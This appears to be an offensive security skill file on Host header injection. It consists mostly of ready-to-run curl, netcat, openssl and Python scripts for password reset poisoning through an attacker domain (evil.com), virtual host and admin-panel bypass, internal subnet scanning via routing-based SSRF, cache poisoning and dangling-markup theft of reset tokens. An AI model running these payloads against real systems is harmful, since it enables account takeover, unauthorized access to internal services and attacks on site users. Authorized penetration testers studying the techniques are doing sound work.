---
name: host-header-attacks
description: Host header injection attacks including password reset poisoning, virtual host routing bypass, cache poisoning, and SSRF via Host header
---

# Host Header Attacks

The Host header tells the server which virtual host to route the request to. When applications trust and reflect the Host header in generated URLs (password resets, redirects, canonical links), attackers can manipulate it for credential theft, cache poisoning, and access control bypass.

## Attack Surface

- Password reset functionality that generates links using the Host header
- Applications behind reverse proxies that trust X-Forwarded-Host
- Virtual host routing where different Host values access different applications
- Canonical URL generation, email link generation, OAuth redirect construction

## Reconnaissance

```bash
# Check how application handles different Host values
curl -sI https://TARGET -H "Host: evil.com" | head -20
curl -sI https://TARGET -H "Host: TARGET:1337" | head -20
curl -sI https://TARGET -H "Host: evil.TARGET" | head -20

# Check for alternative headers
curl -sI https://TARGET -H "X-Forwarded-Host: evil.com" | head -20
curl -sI https://TARGET -H "X-Host: evil.com" | head -20
curl -sI https://TARGET -H "Forwarded: host=evil.com" | head -20

# Test virtual host enumeration
for host in admin staging dev internal api; do
  echo "--- $host.TARGET ---"
  curl -sk https://TARGET -H "Host: $host.TARGET" | head -5
done
```

## Key Vulnerabilities

### Password Reset Poisoning

```bash
# Trigger password reset with poisoned Host header
# The reset email will contain: https://evil.com/reset?token=SECRET
curl -sk "https://TARGET/forgot-password" -X POST \
  -H "Host: evil.com" \
  -d "email=victim@example.com"

# Alternate headers
curl -sk "https://TARGET/forgot-password" -X POST \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@example.com"

# Port-based injection
curl -sk "https://TARGET/forgot-password" -X POST \
  -H "Host: TARGET:evil.com" \
  -d "email=victim@example.com"

# Double Host header
curl -sk "https://TARGET/forgot-password" -X POST \
  -H "Host: TARGET" -H "Host: evil.com" \
  -d "email=victim@example.com"

# Absolute URL in request line (bypasses Host header validation)
printf 'POST https://TARGET/forgot-password HTTP/1.1\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 25\r\n\r\nemail=victim@example.com' | nc TARGET 443
```

### Virtual Host Access Control Bypass

```bash
# Access internal/admin virtual hosts by changing Host header
curl -sk https://TARGET -H "Host: localhost" | head -50
curl -sk https://TARGET -H "Host: 127.0.0.1" | head -50
curl -sk https://TARGET -H "Host: admin.TARGET" | head -50
curl -sk https://TARGET -H "Host: internal.TARGET" | head -50
curl -sk https://TARGET -H "Host: staging.TARGET" | head -50

# IP-based virtual hosts
for ip in 127.0.0.1 10.0.0.1 192.168.1.1 172.16.0.1; do
  echo "--- Host: $ip ---"
  curl -sk "https://TARGET/" -H "Host: $ip" | head -10
done
```

### Cache Poisoning via Host Header

```bash
# If Host header is reflected in cached responses
curl -sk "https://TARGET/static/page?cb=$(date +%s)" -H "Host: evil.com" | grep "evil.com"
# If evil.com appears in <link>, <script>, or <a> tags → cache poisoning XSS

# Verify cache serves poisoned content to clean request
sleep 2
curl -sk "https://TARGET/static/page?cb=SAME_VALUE" | grep "evil.com"
```

### SSRF via Host Header

```bash
# Backend makes internal request using Host header value
curl -sk "https://TARGET/" -H "Host: 169.254.169.254" | head -20
curl -sk "https://TARGET/" -H "Host: 127.0.0.1:6379" | head -20
curl -sk "https://TARGET/" -H "Host: internal-api.local" | head -20
```

### Routing-Based SSRF (Practitioner Critical)

When the application uses the Host header for backend routing (common with reverse proxies and load balancers), you can route requests to arbitrary internal hosts:

```bash
# Route the request to an internal admin panel via Host header
# The connection goes to TARGET's IP, but Host routes internally
curl -sk "https://TARGET/" -H "Host: 192.168.0.1" --resolve TARGET:443:ACTUAL_IP
# If you get different content → routing-based SSRF confirmed

# Scan internal hosts via Host header
for i in $(seq 1 254); do
  result=$(curl -sk "https://TARGET/" -H "Host: 192.168.0.$i" -o /dev/null -w "%{http_code}:%{size_download}" 2>/dev/null)
  if [ "$result" != "504:0" ] && [ "$result" != "000:0" ]; then
    echo "192.168.0.$i → $result"
  fi
done

# Access admin panel once found
curl -sk "https://TARGET/admin" -H "Host: 192.168.0.FOUND_IP"
curl -sk "https://TARGET/admin/delete?username=carlos" -H "Host: 192.168.0.FOUND_IP"
```

### Absolute URL + Host Mismatch

Some servers parse the absolute URL in the request line separately from the Host header — exploit this disagreement:

```bash
# Use absolute URL in request line — server routes based on Host, 
# but application logic uses the absolute URL
# This requires a raw HTTP connection:
printf 'GET https://TARGET/ HTTP/1.1\r\nHost: COLLABORATOR.oastify.com\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# Or use Python
python3 -c "
import socket, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = ctx.wrap_socket(socket.create_connection(('TARGET', 443)), server_hostname='TARGET')
sock.send(b'GET https://TARGET/ HTTP/1.1\r\nHost: COLLABORATOR\r\nConnection: close\r\n\r\n')
print(sock.recv(4096).decode())
"
```

### Connection State Attack (Keep-Alive Poison)

Send a legitimate first request with valid Host, then reuse the same connection for a second request with a malicious Host:

```python
#!/usr/bin/env python3
"""Connection state attack: first request validates, second exploits."""
import socket, ssl

TARGET = "TARGET_HOST"
INTERNAL = "192.168.0.1"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sock = ctx.wrap_socket(socket.create_connection((TARGET, 443)), server_hostname=TARGET)

# Request 1: Valid Host (passes validation, warms connection)
req1 = f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nConnection: keep-alive\r\n\r\n"
sock.send(req1.encode())
resp1 = sock.recv(65535)

# Request 2: Malicious Host on SAME connection (may bypass validation)
req2 = f"GET /admin HTTP/1.1\r\nHost: {INTERNAL}\r\nConnection: close\r\n\r\n"
sock.send(req2.encode())
resp2 = sock.recv(65535)
print(resp2.decode(errors='replace')[:1000])
sock.close()
```

### Dangling Markup in Password Reset

When Host header injection is blocked but special characters in the Host value are not filtered:

```bash
# Inject via port field — some apps use Host including port for URL generation
curl -sk "https://TARGET/forgot-password" -X POST \
  -H "Host: TARGET:@evil.com" \
  -d "email=victim@example.com"
# Result: reset link becomes https://TARGET:@evil.com/reset?token=SECRET
# Browser treats evil.com as the actual host (@ is userinfo separator)

# Dangling markup via Host header (steal token from email HTML)
curl -sk "https://TARGET/forgot-password" -X POST \
  -H "Host: TARGET:'><a href='//evil.com/?" \
  -d "email=victim@example.com"
# If injected into email HTML, creates a link capturing subsequent content
```

### Web Cache Poisoning + Host Header

```python
import requests, time

target_ip = "TARGET_IP"  # Use IP to bypass DNS
target_host = "TARGET"
evil = "evil.com"

headers_to_test = [
    ("Host", evil),
    ("X-Forwarded-Host", evil),
    ("X-Host", evil),
    ("X-Original-URL", f"https://{evil}/"),
    ("Forwarded", f"host={evil}"),
    ("X-Forwarded-Server", evil),
]

for header_name, header_val in headers_to_test:
    cb = str(int(time.time()))
    url = f"https://{target_ip}/?cb={cb}"
    headers = {"Host": target_host, header_name: header_val}
    
    r = requests.get(url, headers=headers, verify=False, timeout=5)
    if evil in r.text:
        print(f"[VULN] {header_name}: {header_val} reflected in response!")
        print(f"  Check: {r.text[:300]}")
```

## Testing Methodology

1. **Baseline** — send normal request, note response content (links, redirects, canonical URLs)
2. **Inject Host** — change Host header to `evil.com`, compare response for reflections
3. **Test alternatives** — X-Forwarded-Host, X-Host, Forwarded, double Host headers
4. **Test password reset** — trigger with poisoned Host, check if email contains attacker domain
5. **Test virtual hosts** — try internal hostnames (localhost, admin, staging) via Host header
6. **Test cache impact** — check if poisoned Host persists in cached responses
7. **Test SSRF** — use internal IPs/hostnames as Host value to probe internal services

## Validation

1. Password reset email contains attacker-controlled domain in reset link
2. Different Host header returns different application content (virtual host bypass)
3. Cached response reflects attacker Host to subsequent users
4. Internal service responds to Host-header-routed request

## False Positives

- Application validates Host against whitelist (returns 400 or redirects to correct host)
- Proxy normalizes Host header before forwarding
- Application uses configuration-based URL generation (not Host header derived)

## Impact

- **Critical**: Password reset poisoning → account takeover (victim clicks link in email)
- **High**: Cache poisoning via Host → XSS at CDN scale
- **High**: Virtual host bypass → access to admin/internal applications
- **Medium**: SSRF via Host header → internal service discovery

## Pro Tips

1. Password reset poisoning is the highest-impact Host header attack — always test it first
2. Try BOTH `Host: evil.com` AND `X-Forwarded-Host: evil.com` — different layers handle them differently
3. Double Host headers exploit parser disagreements: first Host for routing, second for URL generation
4. Port injection (`Host: TARGET:@evil.com`) can bypass some Host validation
5. Absolute URL in the request line (`GET https://TARGET/ HTTP/1.1\r\nHost: evil.com`) bypasses many checks
6. Django, Rails, and Spring all have had Host header injection CVEs — check framework version
7. The victim doesn't visit your site — they click a link in their email — making this particularly dangerous
8. Test with actual email delivery — some apps validate Host at render time, not at email generation time
